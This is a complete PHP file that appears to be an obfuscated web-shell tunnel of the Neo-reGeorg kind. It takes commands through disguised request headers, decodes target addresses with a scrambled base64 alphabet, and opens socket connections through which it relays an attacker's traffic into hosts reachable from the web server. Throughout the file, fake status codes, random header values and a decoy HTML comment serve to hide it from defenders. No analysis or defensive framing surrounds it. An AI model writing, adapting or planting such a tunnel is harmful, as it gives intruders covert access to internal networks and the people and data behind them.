<?php
ini_set("allow_url_fopen", true);
ini_set("allow_url_include", true);
error_reporting(E_ERROR | E_PARSE);

if(version_compare(PHP_VERSION,'5.4.0','>='))@http_response_code(200);

if( !function_exists('apache_request_headers') ) {
    function apache_request_headers() {
        $arh = array();
        $rx_http = '/\AHTTP_/';

        foreach($_SERVER as $key => $val) {
            if( preg_match($rx_http, $key) ) {
                $arh_key = preg_replace($rx_http, '', $key);
                $rx_matches = array();
                $rx_matches = explode('_', $arh_key);
                if( count($rx_matches) > 0 and strlen($arh_key) > 2 ) {
                    foreach($rx_matches as $ak_key => $ak_val) {
                        $rx_matches[$ak_key] = ucfirst($ak_val);
                    }

                    $arh_key = implode('-', $rx_matches);
                }
                $arh[ucwords(strtolower($arh_key))] = $val;
            }
        }
        return($arh);
    }
}

set_time_limit(0);
$headers=apache_request_headers();
$en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
$de = "lD+LqGUEp8O/C3r9c6RI5ByYbgWjFAt1TH7w0Qhm2knvuexsPiaV4SZKdoXNfzJM";

$cmd = $headers["Mrzhafr"];
$mark = substr($cmd,0,22);
$cmd = substr($cmd, 22);
$run = "run".$mark;
$writebuf = "writebuf".$mark;
$readbuf = "readbuf".$mark;

switch($cmd){
    case "jdX8vOiWDZSHpbaHlIfIgy4oUyPbcjnHaV1qnR":
        {
            $target_ary = explode("|", base64_decode(strtr($headers["Oz"], $de, $en)));
            $target = $target_ary[0];
            $port = (int)$target_ary[1];
            $res = fsockopen($target, $port, $errno, $errstr, 1);
            if ($res === false)
            {
                header('Ucdo: GEBxb3PFL8BsnUjlKpdD61tb9wdtNm4h5sItUyDbdow');
                header('Eiwursigglpdak: 7fsyida_k5nQEs5k2MrSyKS4Tq44oFe');
                return;
            }

            stream_set_blocking($res, false);
            ignore_user_abort();

            @session_start();
            $_SESSION[$run] = true;
            $_SESSION[$writebuf] = "";
            $_SESSION[$readbuf] = "";
            session_write_close();

            while ($_SESSION[$run])
            {
                if (empty($_SESSION[$writebuf])) {
                    usleep(50000);
                }

                $readBuff = "";
                @session_start();
                $writeBuff = $_SESSION[$writebuf];
                $_SESSION[$writebuf] = "";
                session_write_close();
                if ($writeBuff != "")
                {
                    stream_set_blocking($res, false);
                    $i = fwrite($res, $writeBuff);
                    if($i === false)
                    {
                        @session_start();
                        $_SESSION[$run] = false;
                        session_write_close();
                        return;
                    }
                }
                stream_set_blocking($res, false);
                while ($o = fgets($res, 10)) {
                    if($o === false)
                    {
                        @session_start();
                        $_SESSION[$run] = false;
                        session_write_close();
                        return;
                    }
                    $readBuff .= $o;
                }
                if ($readBuff != ""){
                    @session_start();
                    $_SESSION[$readbuf] .= $readBuff;
                    session_write_close();
                }
            }
            fclose($res);
        }
        @header_remove('set-cookie');
        break;
    case "ZN5U3S0IthiHJ1i_rZtetpcyh3GBPhvkuYy9NlBaMUqK_MTFXP1H5wKn":
        {
            @session_start();
            unset($_SESSION[$run]);
            unset($_SESSION[$readbuf]);
            unset($_SESSION[$writebuf]);
            session_write_close();
        }
        break;
    case "EMDMcl8WOh":
        {
            @session_start();
            $readBuffer = $_SESSION[$readbuf];
            $_SESSION[$readbuf]="";
            $running = $_SESSION[$run];
            session_write_close();
            if ($running) {
                header('Ucdo: 1W5I2_aUqUUhDwSSgrRe0Sy5txf52tAdcw01RE');
                header("Connection: Keep-Alive");
                echo strtr(base64_encode($readBuffer), $en, $de);
            } else {
                header('Ucdo: GEBxb3PFL8BsnUjlKpdD61tb9wdtNm4h5sItUyDbdow');
            }
        }
        break;
    case "7pi6u44g8GfIlpR7AjhGIOtY5anXrCqRm56": {
            @session_start();
            $running = $_SESSION[$run];
            session_write_close();
            if(!$running){
                header('Ucdo: GEBxb3PFL8BsnUjlKpdD61tb9wdtNm4h5sItUyDbdow');
                header('Eiwursigglpdak: kJ5kwcF_1rJLVvM6M9WW7Y0R0srNF8JF29ez4P');
                return;
            }
            header('Content-Type: application/octet-stream');
            $rawPostData = file_get_contents("php://input");
            if ($rawPostData) {
                @session_start();
                $_SESSION[$writebuf] .= base64_decode(strtr($rawPostData, $de, $en));
                session_write_close();
                header('Ucdo: 1W5I2_aUqUUhDwSSgrRe0Sy5txf52tAdcw01RE');
                header("Connection: Keep-Alive");
            } else {
                header('Ucdo: GEBxb3PFL8BsnUjlKpdD61tb9wdtNm4h5sItUyDbdow');
                header('Eiwursigglpdak: wRwGKs9GBjbqsFfQK_96izt7EEDsb1Nxs7_K4dZMn0NKS5cOosuLqsU');
            }
        }
        break;
    default: {
        @session_start();
        session_write_close();
        exit("<!-- 3gH9SoOLKdYgNH2H0nIES6mceA991vsKCVLjXRP4AP_xapnquct -->");
    }
}
